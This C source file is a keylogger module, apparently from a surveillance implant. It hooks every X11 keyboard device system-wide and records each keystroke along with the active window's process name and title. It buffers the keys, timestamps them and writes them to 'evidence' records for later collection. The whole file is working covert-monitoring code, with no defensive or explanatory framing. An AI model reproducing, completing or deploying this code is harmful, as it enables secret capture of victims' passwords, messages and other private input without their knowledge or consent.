#define _BSD_SOURCE
#define XK_MISCELLANY
#define XK_XKB_KEYS
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <sys/param.h>
#include <sys/select.h>
#include <openssl/bio.h>
#include <X11/Xlib.h>
#include <X11/keysymdef.h>
#include <X11/extensions/XInput.h>

#include "module.h"
#include "evidencemanager.h"
#include "runtime.h"
#include "bioutils.h"
#include "xutils.h"
#include "me.h"

static BIO *evidence = NULL;
static pthread_mutex_t evidence_mutex = PTHREAD_MUTEX_INITIALIZER;

static void convertevent(XDeviceKeyPressedEvent *src, XKeyPressedEvent *dst);
static int bufferadd(BIO *data, XIC xic, XKeyPressedEvent keyevent);
static void bufferflush(BIO *data, char *process, char *title, int *forceheader);

void *module_keylog_main(void *args)
{
   Display *display = NULL;
   XIM xim = NULL;
   XIC xic = NULL;
   int i, devnum = 0, keyboardnum = 0, keypress = 0;
   XDeviceInfo *devinfo = NULL;
   XDevice **device = NULL;
   XEventClass evlist;
   XKeyPressedEvent keyevent;
   XEvent event;
   int maxfd = -1, xfd = -1;
   int count = 0, forceheader = 0, ret;
   fd_set rfds;
   struct timeval tv;
   BIO *data = NULL;
   char *process = NULL, *title = NULL, *newprocess = NULL, *newtitle = NULL;

   debugme("Module KEYLOG started\n");
   if(initlib(INIT_LIBXI)) return NULL;

   do {
      if(!(display = XOpenDisplay(NULL))) break;
      if((xfd = ConnectionNumber(display)) < 0) break;
      if(!(xim = XOpenIM(display, NULL, NULL, NULL))) break;
      if(!(xic = XCreateIC(xim, XNInputStyle, XIMPreeditNothing|XIMStatusNothing, NULL))) break;
      if(!(devinfo = XListInputDevices(display, &devnum)) || !devnum) break;
      if(!(device = calloc(devnum, sizeof(XDevice *)))) break;
      if(!(data = BIO_new(BIO_s_mem()))) break;

      for(i = 0; i < devnum; i++) {
         if(devinfo[i].use == IsXExtensionKeyboard) {
            if(!(device[i] = XOpenDevice(display, devinfo[i].id))) continue;
            DeviceKeyPress(device[i], keypress, evlist);
            XSelectExtensionEvent(display, DefaultRootWindow(display), &evlist, 1);
            keyboardnum++;
         }
      }
      if(!keyboardnum) break;

      maxfd = MAX(xfd, MODULE_KEYLOG.event) + 1;

      while(MODULE_KEYLOG.status != MODULE_STOPPING) {
         do {
            if(!XPending(display)) {
               FD_ZERO(&rfds);
               FD_SET(xfd, &rfds);
               FD_SET(MODULE_KEYLOG.event, &rfds);
               tv.tv_sec = 10 - count;
               tv.tv_usec = 0;
               if((ret = select(maxfd, &rfds, NULL, NULL, &tv)) == -1) break;
               if(!ret) {
                  if(count && (count++ >= 10)) {
                     bufferflush(data, process, title, &forceheader);
                     count = 0;
                  }
                  break;
               }
            }
            if(MODULE_KEYLOG.status == MODULE_STOPPING) break;
            if(XNextEvent(display, &event)) break;
            if(event.type != keypress) break;

            getwindowproperties(display, getactivewindow(display), &newprocess, &newtitle);
            if(!process || !title || strcmp(process, newprocess) || (strcmp(title, newtitle))) {
               if(process) free(process);
               process = newprocess;
               if(title) free(title);
               title = newtitle;
               forceheader = 1;
               if(count) {
                  bufferflush(data, process, title, &forceheader);
                  count = 0;
               }
            } else {
               if(newprocess) free(newprocess);
               if(newtitle) free(newtitle);
            }

            convertevent((XDeviceKeyPressedEvent *)&event, &keyevent);

            if(bufferadd(data, xic, keyevent)) break;

            if(count++ >= 10) {
               bufferflush(data, process, title, &forceheader);
               count = 0;
            }
         } while(0);
      }
   } while(0); 

   if(count) bufferflush(data, process, title, &forceheader);
   module_keylog_flush();

   if(process) free(process);
   if(title) free(title);
   if(data) BIO_free(data);
   if(device) {
      for(i = 0; i < devnum; i++) if(device[i]) XCloseDevice(display, device[i]);
      free(device);
   }
   if(devinfo) XFreeDeviceList(devinfo);
   if(xic) XDestroyIC(xic);
   if(xim) XCloseIM(xim);
   if(display) XCloseDisplay(display);

   debugme("Module KEYLOG stopped\n");

   return NULL;
}

void module_keylog_flush(void)
{
   pthread_mutex_lock(&evidence_mutex);

   if(evidence) {
      evidence_close(evidence);
      evidence = NULL;
   }

   pthread_mutex_unlock(&evidence_mutex);

   return;
}

static void convertevent(XDeviceKeyPressedEvent *src, XKeyPressedEvent *dst)
{
   dst->type = KeyPress;
   dst->serial = src->serial;
   dst->send_event = src->send_event;
   dst->display = src->display;
   dst->window = src->window;
   dst->root = src->root;
   dst->subwindow = src->subwindow;
   dst->time = src->time;
   dst->x = src->x;
   dst->y = src->y;
   dst->x_root = src->x_root;
   dst->y_root = src->y_root;
   dst->state = src->state;
   dst->keycode = src->keycode;
   dst->same_screen = src->same_screen;

   return;
}

static int bufferadd(BIO *data, XIC xic, XKeyPressedEvent keyevent)
{
   int len;
   char keybuf[7];
   KeySym keysym;
   Status status;

   len = Xutf8LookupString(xic, &keyevent, keybuf, sizeof(keybuf) - 1, &keysym, &status);
   if((status != XLookupBoth) && (status != XLookupKeySym)) return -1;

   switch(keysym) {
      case XK_F1: case XK_F2: case XK_F3: case XK_F4: case XK_F5: case XK_F6: case XK_F7: case XK_F8: case XK_F9: case XK_F10:
      case XK_F11: case XK_F12: case XK_F13: case XK_F14: case XK_F15: case XK_F16: case XK_F17: case XK_F18: case XK_F19: case XK_F20:
         memcpy(keybuf, "\xe2\x91\xa0", 4);
         keybuf[2] += (keysym - XK_F1);
         break;
      case XK_Left: case XK_Up: case XK_Right: case XK_Down:
         memcpy(keybuf, "\xe2\x86\x90", 4);
         keybuf[2] += (keysym - XK_Left);
         break;
      case XK_KP_Left: case XK_KP_Up: case XK_KP_Right: case XK_KP_Down:
         memcpy(keybuf, "\xe2\x86\x90", 4);
         keybuf[2] += (keysym - XK_KP_Left);
         break;
      case XK_Page_Up: case XK_KP_Page_Up:
         memcpy(keybuf, "\xe2\x87\x9e", 4);
         break;
      case XK_Page_Down: case XK_KP_Page_Down:
         memcpy(keybuf, "\xe2\x87\x9f", 4);
         break;
      case XK_Home: case XK_KP_Home:
         memcpy(keybuf, "\xe2\x86\x96", 4);
         break;
      case XK_End: case XK_KP_End:
         memcpy(keybuf, "\xe2\x86\x98", 4);
         break;
      case XK_Return: case XK_KP_Enter:
         memcpy(keybuf, "\xe2\x86\xb5\n", 5);
         break;
      case XK_Delete: case XK_KP_Delete:
         memcpy(keybuf, "\xe2\x90\xa1", 4);
         break;
      case XK_BackSpace:
         memcpy(keybuf, "\xe2\x90\x88", 4);
         break;
      case XK_Tab: case XK_KP_Tab:
         memcpy(keybuf, "\xe2\x87\xa5", 4);
         break;
      case XK_ISO_Left_Tab:
         memcpy(keybuf, "\xe2\x87\xa4", 4);
         break;
      case XK_Escape:
         memcpy(keybuf, "\xe2\x90\x9b", 4);
         break;
      default:
         if(keyevent.state & (ControlMask|Mod1Mask|Mod4Mask|Mod5Mask)) len = 0;
         keybuf[len] = '\0';
   }

   if(keybuf[0]) BIO_puts16(data, keybuf);

   return (keybuf[0] ? 0 : -1);
}

static void bufferflush(BIO *data, char *process, char *title, int *forceheader)
{
   BIO *header = NULL;
   char *dataptr = NULL, *headerptr = NULL;
   long datalen, headerlen;
   time_t ts;
   struct tm tm;

   do {
      if(!data) break;
      if(!(datalen = BIO_get_mem_data(data, &dataptr))) break;

      if(!evidence) *forceheader = 1;

      if(*forceheader) {
         if(!(header = BIO_new(BIO_s_mem()))) break;
         ts = time(NULL);
         gmtime_r(&ts, &tm);
         tm.tm_mon++;
         tm.tm_year += 1900;
         BIO_write(header, "\0\0", 2);
         BIO_write(header, &tm.tm_sec, 4);
         BIO_write(header, &tm.tm_min, 4);
         BIO_write(header, &tm.tm_hour, 4);
         BIO_write(header, &tm.tm_mday, 4);
         BIO_write(header, &tm.tm_mon, 4);
         BIO_write(header, &tm.tm_year, 4);
         BIO_write(header, &tm.tm_wday, 4);
         BIO_write(header, &tm.tm_yday, 4);
         BIO_write(header, &tm.tm_isdst, 4);
         BIO_puts16n(header, process);
         BIO_puts16n(header, title);
         BIO_write(header, "\xDE\xC0\xAD\xAB", 4);

         headerlen = BIO_get_mem_data(header, &headerptr);
      }

      pthread_mutex_lock(&evidence_mutex);
      {
         if(!evidence) evidence = evidence_open(EVIDENCE_TYPE_KEYLOG, NULL, 0);
         if(*forceheader) {
            evidence_add(evidence, headerptr, headerlen);
            *forceheader = 0;
         }
         evidence_add(evidence, dataptr, datalen);
      }
      pthread_mutex_unlock(&evidence_mutex);
   } while(0);

   if(header) BIO_free(header);
   if(data) (void)BIO_reset(data);

   return;
}
